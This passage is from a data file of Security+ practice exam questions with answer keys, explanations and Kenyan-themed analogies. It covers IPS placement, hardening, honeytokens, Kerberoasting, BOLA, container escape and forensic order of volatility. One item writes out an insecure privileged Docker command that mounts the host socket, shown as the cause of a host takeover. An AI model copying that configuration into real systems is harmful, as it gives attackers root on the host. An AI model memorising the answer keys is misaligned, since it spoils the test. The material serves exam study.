        whyWrong: "DAI inspects Layer 2 Ethernet ARP packets, not endpoint application process spawning."
      }
    ],
    technicalRationale: "EDR platforms monitor endpoint kernel and user-space telemetry to detect adversary behaviors (TTPs) rather than relying on brittle file signatures, enabling rapid detection of zero-days and fileless malware.",
    kenyanMetaphor: "Traditional Antivirus is like a security guard at a building gate holding a photo album of known criminals (static signatures); if a criminal changes their clothes or face slightly, the guard lets them pass! EDR is like a sharp undercover detective inside the bank lobby watching behavior: even if someone wears a spotless expensive suit, the moment they pull out a crowbar and start picking the ATM lock (process tree anomaly), the detective tackles them to the ground immediately!"
  },

  {
    id: 42,
    portion: 9,
    subdomain: "2.7 Network & Host Defense / In-Line Prevention (NIPS/HIPS) vs Passive Detection (NIDS/HIDS)",
    scenario: "A financial services institution deploys a security appliance to protect its web cluster against remote code execution exploits. During an ongoing attack, the appliance actively analyzes network packets in transit, reconstructs TCP streams, matches a known Apache Struts exploit signature in real time, drops the malicious packets before they reach the web server, and resets the TCP connection (TCP RST). Concurrently, the junior administrator asks why a SPAN/TAP port configuration was not used instead.",
    question: "What type of defensive system was deployed, and what is the primary operational distinction between this system and a passive SPAN-port IDS?",
    options: [
      {
        text: "Network Intrusion Prevention System (NIPS); it sits physically or logically In-Line with network traffic to actively block/drop attacks, whereas an IDS is Out-of-Band (passive) and can only alert after the packet has already reached the target",
        isCorrect: true,
        whyCorrect: "An Intrusion Prevention System (IPS / NIPS / HIPS) operates In-Line, meaning all network traffic must physically flow through the sensor. This placement empowers the IPS to actively drop packets, block IPs, or inject TCP resets to terminate malicious sessions in real time. In contrast, an Intrusion Detection System (IDS) connects Out-of-Band via a Switched Port Analyzer (SPAN / Port Mirror) or physical TAP; it inspects a copy of the traffic and can only generate alerts or initiate reactive actions after the initial malicious packet has already traversed the network and reached the victim.",
        whyWrong: ""
      },
      {
        text: "Network Intrusion Detection System (NIDS); it terminates all IPsec VPN tunnels",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "An IDS is passive and does not terminate VPN tunnels or drop in-flight malicious traffic."
      },
      {
        text: "Host-based Firewalls; it only filters Layer 2 broadcast loops",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Host firewalls filter network packets by IP/port/application, but do not resolve broadcast loops (which is handled by Spanning Tree Protocol)."
      },
      {
        text: "Web Proxy Cache; it accelerates HTTP GET requests for static image assets",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Web proxies cache content rather than perform in-line deep packet exploit blocking."
      }
    ],
    technicalRationale: "In-line IPS placement allows synchronous packet inspection and immediate dropping of malicious flows. Out-of-band IDS avoids network latency and single points of failure but cannot prevent initial exploit delivery.",
    kenyanMetaphor: "A NIPS is like an armed, eagle-eyed bodyguard standing directly inside the doorway (In-Line): if an attacker charges with a knife, the bodyguard grabs their arm and throws them out before they take a single step inside! A NIDS is like a CCTV camera connected to a screen in the back office (Out-of-Band SPAN): the security guard on the screen sees the attacker stab the manager, and rings the alarm bell shouting 'Someone just got stabbed!'"
  },

  {
    id: 43,
    portion: 9,
    subdomain: "2.7 System Hardening & Principle of Least Functionality / Attack Surface Reduction",
    scenario: "A systems engineer builds a baseline golden master image for new Windows and Linux enterprise servers. During the hardening process, the engineer audits active system daemons, uninstalling legacy telnet-server, TFTP, and FTP utilities, disabling unneeded services like UPnP and Print Spooler, closing unused network ports, and enforcing the removal of all pre-installed manufacturer trial software and default vendor guest accounts.",
    question: "Which core cybersecurity hardening principle is being implemented, and what is the primary security objective?",
    options: [
      {
        text: "Attack Surface Reduction (ASR) following the Principle of Least Functionality; minimizing potential exploit vectors by eliminating unnecessary software, services, and open ports",
        isCorrect: true,
        whyCorrect: "Attack Surface Reduction (ASR) and the Principle of Least Functionality (NIST SP 800-123) state that systems should be configured to provide only essential capabilities and services. Disabling unused services (like Telnet, TFTP, Print Spooler), closing unneeded listening ports, and removing bloatware/default credentials drastically shrinks the attack surface, eliminating potential entry points and vulnerabilities before adversaries can exploit them.",
        whyWrong: ""
      },
      {
        text: "VLAN Double-Tagging; creating 802.1Q nested headers for trunk encapsulation",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "VLAN Double-Tagging is an offensive Layer 2 hopping exploit."
      },
      {
        text: "ARP Spoofing; asserting gateway ownership on local broadcast domains",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "ARP spoofing is a malicious MITM technique, not a defensive hardening standard."
      },
      {
        text: "Cross-Site Request Forgery (CSRF); forcing authenticated browser requests",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "CSRF is an application-level web vulnerability, not an OS server hardening principle."
      }
    ],
    technicalRationale: "The Principle of Least Functionality mandates that systems configure only the functions, ports, protocols, and services necessary to perform business missions, significantly shrinking the adversary attack surface.",
    kenyanMetaphor: "Building a fortress home in upcountry Kenya: If your house has 14 windows, 6 wooden doors, 2 balcony sliding glasses, and a roof skylight, you have a huge attack surface. Hardening (Least Functionality) is bricking up the 10 unnecessary back windows, removing the unnecessary balcony door, and keeping only 1 reinforced steel front door with 3 heavy padlocks! With fewer openings, burglars have nowhere to sneak in!"
  },

  {
    id: 44,
    portion: 9,
    subdomain: "2.8 Security Standards, Baselines & Benchmarks / CIS Benchmarks & SCAP",
    scenario: "A financial auditor requires an enterprise to demonstrate that all 2,000 Red Hat Enterprise Linux and Windows Server virtual machines adhere to rigorous, vendor-neutral security configuration baselines. The enterprise deploys an automated scanner utilizing the Security Content Automation Protocol (SCAP) to audit system registry settings, password policies, audit logging parameters, and file permissions against consensus-driven prescriptive checklists published by the Center for Internet Security (CIS).",
    question: "Which security configuration framework and audit methodology is being utilized?",
    options: [
      {
        text: "CIS Benchmarks verified via automated SCAP compliance scans to prevent and remediate Configuration Drift",
        isCorrect: true,
        whyCorrect: "The Center for Internet Security (CIS) Benchmarks are globally recognized, consensus-based, vendor-agnostic configuration guidelines for hardening operating systems, databases, cloud environments, and network devices. Using SCAP (Security Content Automation Protocol), organizations can automatically scan hundreds of systems simultaneously to measure compliance against Level 1 (basic defense) or Level 2 (defense-in-depth) benchmarks, rapidly identifying and remediating Configuration Drift.",
        whyWrong: ""
      },
      {
        text: "Rainbow Table Precomputations for dictionary password expansion",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Rainbow tables are used to crack password hashes offline, not audit system compliance."
      },
      {
        text: "BGP Route Hijacking via autonomous system path manipulation",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "BGP hijacking is an Internet routing protocol attack, completely unrelated to endpoint configuration baselines."
      },
      {
        text: "SSL Stripping via on-path HTTP proxy injection",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SSL stripping is an on-path MITM downgrade attack."
      }
    ],
    technicalRationale: "CIS Benchmarks provide prescriptive system hardening guidelines. SCAP automation enables continuous compliance monitoring and automated remediation of unauthorized configuration changes.",
    kenyanMetaphor: "Kenya Bureau of Standards (KEBS) vehicle safety inspection: KEBS publishes a standardized 50-point checklist (brakes, tires, seatbelts, speed governor, headlights). Instead of a mechanic guessing whether a vehicle is roadworthy, an automated inspection station runs the vehicle through computerized sensors (SCAP scan) that test every item against the official KEBS standard checklist (CIS Benchmark) in 3 minutes!"
  },

  {
    id: 45,
    portion: 9,
    subdomain: "2.8 Deception Technologies / Honeypots & Canary Tokens (Honeytokens)",
    scenario: "An organization creates an unused fake administrator account named sql_svc_backup in Active Directory with an exceptionally long, complex password. The account has no legitimate business purpose and is never used by staff or services. The SOC configures a high-fidelity SIEM alert that triggers immediately if any authentication attempt or Kerberoasting ticket request is made against this account. Additionally, a fake AWS API key is placed inside an internal software repository.",
    question: "Which deception technology and decoy artifact did the security team deploy?",
    options: [
      {
        text: "Honeytokens (Canary Credentials / Decoy Objects) designed to detect unauthorized internal reconnaissance and credential harvesting with near-zero false positives",
        isCorrect: true,
        whyCorrect: "Honeytokens (or Canary Tokens) are digital decoy artifacts (such as fake Active Directory accounts, fake database records, fake API keys, or seeded decoy files) embedded within production systems. Because the honeytoken has no valid business function, legitimate users will never access it. Therefore, any access attempt, query, or authentication against the token provides an immediate, high-confidence alert indicating that an adversary or malicious insider is actively conducting reconnaissance or harvesting credentials.",
        whyWrong: ""
      },
      {
        text: "Logic Bomb designed to corrupt hard drives upon employee termination",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A logic bomb is malicious code triggered by a specific condition, not a defensive detection decoy."
      },
      {
        text: "Ransomware designed to extort corporate cryptocurrency payments",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Ransomware is malicious extortion software deployed by threat actors."
      },
      {
        text: "Typosquatting designed to redirect customers to fraudulent websites",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Typosquatting is an offensive domain spoofing technique."
      }
    ],
  },

  // ==========================================
  // PORTION 10 (Q46 - Q50) [FINAL CAPSTONE]
  // ==========================================
  {
    id: 46,
    portion: 10,
    subdomain: "2.8 Vulnerability Management & Threat Intelligence Prioritization (CISA KEV & EPSS)",
    scenario: "An enterprise vulnerability scanner reports 4,200 unpatched Common Vulnerabilities and Exposures (CVEs) across the organization's cloud and on-premises estate. The systems team cannot patch all 4,200 vulnerabilities within the quarterly maintenance window without causing severe operational disruption. Rather than prioritizing solely by static CVSS Base Scores (which would flag hundreds of theoretical vulnerabilities with no real-world exploits), the CISO mandates that remediation MUST focus on vulnerabilities with confirmed weaponization in active campaigns.",
    question: "Which threat intelligence resource and predictive scoring system should the team cross-reference to prioritize actively exploited vulnerabilities?",
    options: [
      {
        text: "CISA Known Exploited Vulnerabilities (KEV) Catalog combined with the Exploit Prediction Scoring System (EPSS)",
        isCorrect: true,
        whyCorrect: "CompTIA SY0-701 heavily emphasizes risk-based vulnerability management. The CISA Known Exploited Vulnerabilities (KEV) Catalog provides an authoritative database of CVEs that adversaries are actively exploiting in the wild. When combined with the Exploit Prediction Scoring System (EPSS)—which estimates the statistical probability that a software vulnerability will be exploited in the next 30 days—organizations can prioritize high-probability, weaponized threats ahead of theoretical high-CVSS vulnerabilities.",
        whyWrong: ""
      },
      {
        text: "The local switch MAC address forwarding table (CAM Table)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "CAM tables store Layer 2 switch MAC addresses, having zero relation to vulnerability prioritization."
      },
      {
        text: "The corporate public DNS SPF and DKIM text records",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SPF/DKIM are email authentication TXT records used to prevent email spoofing."
      },
      {
        text: "The local workstation hosts file located in /etc/hosts",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "The local /etc/hosts file maps hostnames to IP addresses locally and does not provide vulnerability intelligence."
      }
    ],
    technicalRationale: "Risk-based vulnerability management correlates internal scan data with external threat intelligence feeds (CISA KEV, EPSS) to focus immediate remediation on actively weaponized flaws.",
    kenyanMetaphor: "You are a doctor at Kenyatta National Hospital managing 100 emergency patients. You cannot attend to all 100 at the exact same second. If you treat someone with a small theoretical allergy ahead of a gunshot victim who is actively bleeding (CISA KEV), the gunshot victim will die! Risk-based triage means you immediately treat the injuries that are actively threatening life right now!"
  },

  {
    id: 47,
    portion: 10,
    subdomain: "2.4 Identity & Authentication Attacks / Kerberoasting & gMSA Mitigations",
    scenario: "A penetration tester authenticates as a standard domain user on a corporate Active Directory network. The tester queries the domain controller for all user accounts that have registered Service Principal Names (SPNs) (e.g., MSSQLSvc/db01.corp:1433). The tester requests Kerberos Ticket Granting Service (TGS) tickets for these service accounts, extracting the encrypted tickets from memory. The tickets were encrypted using the service account's password hash with legacy RC4-HMAC. The tester moves the ticket files to an offline GPU cracking cluster and recovers the service account's plaintext password in under 20 minutes.",
    question: "Which identity attack was executed, and which Active Directory architecture enhancement eliminates this vulnerability?",
    options: [
      {
        text: "Kerberoasting; migrate all service accounts to Group Managed Service Accounts (gMSA) with 128-character complex passwords and enforce AES-256 Kerberos encryption",
        isCorrect: true,
        whyCorrect: "Kerberoasting allows any valid domain user to request a Kerberos TGS ticket for any service associated with an SPN. Because the ticket is encrypted with the NTLM hash of the service account, the attacker can extract it from memory and perform offline dictionary/brute-force cracking without alerting the domain controller. Migrating to Group Managed Service Accounts (gMSA) eliminates this threat because Active Directory automatically generates, rotates, and manages 128-character random passwords that are practically uncrackable, while enforcing AES-256 Kerberos ticket encryption.",
        whyWrong: ""
      },
      {
        text: "Cross-Site Scripting (XSS); install an SSL certificate on the database server",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS is a web browser exploit, not an Active Directory ticket extraction attack."
      },
      {
        text: "SQL Injection; convert database queries into dynamic string concatenations",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Dynamic string concatenation causes SQL injection rather than mitigating it."
      },
      {
        text: "Evil Twin Attack; broadcast a secondary hidden SSID on the access point",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Evil Twin is a rogue Wi-Fi AP attack, completely unrelated to Kerberos authentication tickets."
      }
    ],
    technicalRationale: "Kerberoasting targets legacy service accounts with weak passwords. gMSAs delegate password management to the Domain Controller with automated 128-character rotations and AES-256 encryption, neutralizing offline cracking.",
    kenyanMetaphor: "A company security guard carries a master padlock key to the back warehouse. Any employee can ask the guard to see the stamped seal on the padlock receipt (Kerberos TGS ticket). A rogue employee takes a photograph of the wax seal and goes to an underground metal workshop in Gikomba to carve a replica key overnight (Offline Cracking). gMSA is replacing the physical padlock with an automated military-grade digital vault that changes its 128-digit cryptographic code automatically every 30 days without any human ever knowing the code!"
  },

  {
    id: 48,
    portion: 10,
    subdomain: "2.3 Application & API Security / Broken Object Level Authorization (BOLA / IDOR)",
    scenario: "A healthcare mobile application provides patients with digital access to their laboratory blood test reports. When patient Alice (User ID: 4081) clicks 'View My Lab Results', her mobile app transmits an API request: GET /api/v1/patients/4081/lab_records with her valid JWT authentication token. An attacker intercepts the traffic using an intercepting proxy and changes the URI path to GET /api/v1/patients/4082/lab_records. The API server validates that the JWT token is authentic, but fails to check whether User 4081 is authorized to view User 4082's records, returning patient 4082's complete medical history in plaintext JSON.",
    question: "Which vulnerability category (classified as #1 on the OWASP API Security Top 10) was exploited?",
    options: [
      {
        text: "Broken Object Level Authorization (BOLA / Insecure Direct Object References - IDOR); remediated by implementing strict server-side authorization checks that validate the requester's identity against the requested object's access control policy",
        isCorrect: true,
        whyCorrect: "Broken Object Level Authorization (BOLA), historically known as Insecure Direct Object References (IDOR), is the #1 vulnerability on the OWASP API Security Top 10. It occurs when an API endpoint relies on user-supplied input (e.g., IDs in URLs like /patients/4082) to access an object without verifying that the authenticated user possesses explicit authorization to access that specific data object. Mitigation requires server-side access control checks: verifying that session.user.id == requested_object.owner_id.",
        whyWrong: ""
      },
      {
        text: "Buffer Overflow; remediated by compiling code with Address Space Layout Randomization (ASLR)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Buffer overflows corrupt process memory stacks and execution registers, not web API authorization checks."
      },
      {
        text: "DNS Cache Poisoning; remediated by enabling DNSSEC on the authoritative zone",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS Cache Poisoning modifies DNS resolver caches, having zero impact on application-layer API record authorization."
      },
      {
        text: "Replay Attack; remediated by adding cryptographic timestamps to the Ethernet preamble",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Replay attacks retransmit valid captured packets without modifications, and Ethernet preambles do not contain application timestamps."
      }
    ],
    technicalRationale: "BOLA/IDOR stems from missing access control checks at the data layer. Robust APIs enforce ABAC/RBAC validation to guarantee that the authenticated subject is explicitly authorized to interact with the target resource object.",
    kenyanMetaphor: "You deposit your luggage at a bus terminal parcel office in Machakos and receive claim ticket #4081. When you go to collect it, you show your genuine national ID card (valid authentication token), but you maliciously say to the clerk: 'Give me parcel #4082.' The lazy clerk checks that your ID is real, but never checks if ticket #4082 actually belongs to you, handing you someone else's expensive suitcase (BOLA / IDOR)!"
  },

  {
    id: 49,
    portion: 10,
    subdomain: "2.7 Cloud, Virtualization & Container Security / Container Escape & Privilege Separation",
    scenario: "A cloud microservices cluster hosts customer-facing web apps in Docker containers running on an Ubuntu Linux node. A developer launches a container using the command docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock web_service. An attacker exploits an arbitrary file upload flaw in the web app to gain a remote shell inside the container. Using access to the mounted Docker socket and full Linux kernel capabilities (CAP_SYS_ADMIN), the attacker communicates directly with the host's Docker daemon, spawns a new root container mounting the host's root filesystem /, and takes complete control of the physical host server.",
    question: "What category of virtualization/container attack was executed, and which configuration hardening practice would have PREVENTED the host takeover?",
    options: [
      {
        text: "Container Escape (Host Breakout); run containers in Rootless mode, never use --privileged, drop unnecessary Linux capabilities (--cap-drop=ALL), and never expose the host Docker socket to untrusted containers",
        isCorrect: true,
        whyCorrect: "Container Escape occurs when an adversary breaks out of the container's isolated namespaces and cgroups into the underlying host operating system. Running containers with --privileged removes all security isolation, granting all Linux kernel capabilities. Exposing /var/run/docker.sock allows anything inside the container to issue commands to the host Docker daemon as root. Secure container baselines mandate rootless containers, least-privilege capability dropping (--cap-drop=ALL), and seccomp/AppArmor isolation profiles.",
        whyWrong: ""
      },
      {
        text: "Typosquatting; configure brand monitoring across public TLDs",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Typosquatting is a domain name spoofing scam, completely unrelated to Linux containers."
      },
      {
        text: "ARP Spoofing; enable Dynamic ARP Inspection on the upstream switch",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "ARP spoofing is a Layer 2 LAN attack, not a container breakout."
      },
      {
        text: "Smurf Attack; block ICMP broadcast requests at the boundary router",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A Smurf attack is an ICMP directed broadcast DDoS attack, unrelated to container host isolation."
      }
    ],
    technicalRationale: "Container isolation relies on Linux cgroups, namespaces, and restricted capabilities. Running privileged containers or exposing Docker sockets effectively grants root access to the host kernel.",
    kenyanMetaphor: "You rent a private hotel room in a lodge (container). A safe hotel keeps the room doors locked and forbids guests from accessing the hotel's master breaker room. But the careless hotel manager gives you the master keys to the hotel's central power, water, and CCTV control room (--privileged + docker.sock). You walk out of your bedroom, take over the hotel's central control panel, lock the manager out of his own building, and take full control of the entire facility (Container Escape)!"
  },

  {
    id: 50,
    portion: 10,
    subdomain: "2.6 Digital Forensics & Incident Response / Order of Volatility & Evidence Preservation",
    scenario: "A lead incident responder arrives at a branch office where a critical financial transaction server is actively compromised and communicating with a known cybercriminal IP address. The responder must collect forensic evidence to support criminal prosecution. The junior technician on-site reaches for the server's power cable to pull the plug, claiming it will 'freeze the malware instantly.' The lead responder halts the technician immediately, citing the RFC 3227 / CompTIA Order of Volatility.",
    question: "What is the correct forensic Order of Volatility that the investigator MUST adhere to when preserving digital evidence from most volatile to least volatile?",
    options: [
      {
        text: "CPU Registers and Cache -> Routing Tables, ARP Cache, Process Tables, Kernel Statistics -> System Memory (RAM) -> Temporary File Systems -> Disk / Solid-State Storage -> Remote Logging Data -> Physical Configuration and Network Topology -> Archival Media (Backups)",
        isCorrect: true,
        whyCorrect: "According to RFC 3227 and CompTIA guidelines, digital evidence must be collected in order of decreasing volatility (most perishable to least perishable). Pulling the power cord wipes CPU registers, cache, and all volatile RAM, destroying vital unencrypted encryption keys, active network socket states, running in-memory processes, and injected DLLs. The strict order is: 1. CPU Registers and Cache; 2. Routing tables, ARP cache, process tables, kernel memory; 3. System RAM (volatile memory); 4. Temporary file systems; 5. Disk storage (HDDs/SSDs); 6. Remote logging data; 7. Network topology and physical cabling; 8. Archival backups and magnetic tapes.",
        whyWrong: ""
      },
      {
        text: "Archival Tape Backups -> Optical Discs -> Solid-State Drives -> Hard Drives -> Volatile RAM",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Inverts the order: non-volatile backups are preserved for years, whereas volatile RAM is destroyed in microseconds when power is lost."
      },
      {
        text: "Physical Network Topology -> Temporary Files -> CPU Registers -> Hard Disk Partitions",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Puts static network cables ahead of highly perishable CPU registers and RAM."
      },
      {
        text: "Printed Paper Invoices -> Archival Tapes -> Disk Storage -> CPU Cache -> System RAM",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Scrambles the order: physical paper printouts are permanent physical media, not volatile digital data."
      }
    ],
    technicalRationale: "RFC 3227 establishes the Order of Volatility to ensure volatile forensic artifacts (RAM, CPU cache, network state) are captured before they are overwritten or destroyed by system reboots or power loss.",
    kenyanMetaphor: "Arriving at an active crime scene in a house where water is running, ice is melting, and a candle is burning. If you first sit down to photocopy the property deed papers in the metal safe (Archival Backups), the ice cubes in the glass will melt into water, the burning candle wax will evaporate, and the wet footprints on the tile will dry up completely (CPU Registers & RAM)! A trained detective takes photos and samples of the melting ice and wet footprints first before touching the static books on the shelf!"
  }
];





